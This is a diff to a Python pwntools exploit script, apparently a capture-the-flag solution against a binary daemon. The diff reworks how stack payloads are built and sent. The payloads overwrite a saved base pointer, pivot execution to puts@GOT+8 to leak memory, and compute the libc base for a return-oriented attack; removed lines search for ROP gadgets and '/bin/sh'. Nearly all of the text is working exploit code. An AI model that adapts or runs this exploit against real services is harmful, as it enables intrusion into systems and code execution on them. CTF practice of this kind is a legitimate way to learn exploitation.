@@ -3,10 +3,8 @@
 # gdb> info files
 # pmap
 
-import sys
 from pwn import *
 
-# 스트링을 DE:AD:BE:EF 형태로 프린트해준다.
 def hexify(x):
     return ":".join("{:02x}".format(ord(c)) for c in x)
 
@@ -32,17 +30,12 @@ b *0x40051f
 
 if __name__ == "__main__":
 
-#    log.info('pop rsi: %#x' % libc.search(asm('pop rsi; ret')).next())
-#    log.info('pop rdi: %#x' % libc.search(asm('pop rdi; ret')).next())
-#    log.info('pop rdx: %#x' % libc.search(asm('pop rdx; ret')).next())
-#    log.info('/bin/sh: %#x' % libc.search('/bin/sh').next())
+    payload = ""
+    payload += p64(9)
+    payload += p64(0xcafebabedeadbeef) 
+    payload += "A" # overwrite NULL (unless puts() would terminate before the stored rbp)
 
-    rop = ""
-    rop += p64(0xcafebabedeadbeef) 
-    rop += "A" # overwrite NULL (unless puts() would terminate before the stored rbp)
-
-    r.send(p64(9));
-    r.send(rop)
+    r.send(payload)
     resp = r.recv()
 
 # start() stores the address of mmapped region at rbp (in fact, plus 0x2000)
@@ -69,12 +62,13 @@ if __name__ == "__main__":
 # store puts@got+8 into rbp & jump to 0x40051f
 
     PUTS_GOT = b.got['puts']
-    rop = ""
-    rop += p64(0xcafebabedeadbeef)
-    rop += p64(PUTS_GOT+8)
-    rop += p64(0x40051F)
-    r.send(p64(24))
-    r.send(rop)     
+    payload = ""
+    payload += p64(24)
+    payload += p64(0xcafebabedeadbeef)
+    payload += p64(PUTS_GOT+8)
+    payload += p64(0x40051F)
+
+    r.send(payload)     
     resp = r.recv()
     print hexify(resp)
 
@@ -90,5 +84,6 @@ if __name__ == "__main__":
 
     log.info('mmaped - LIBC_BASE: %#x' % (mmap - LIBC_BASE))
 
-# now we know the difference, so we can calc the LIBC_BASE without killing the daemon
+# now we know the difference, 
 # and the difference won't change (pretty deterministic)
+# so, we can calc LIBC_BASE without killing the daemon.
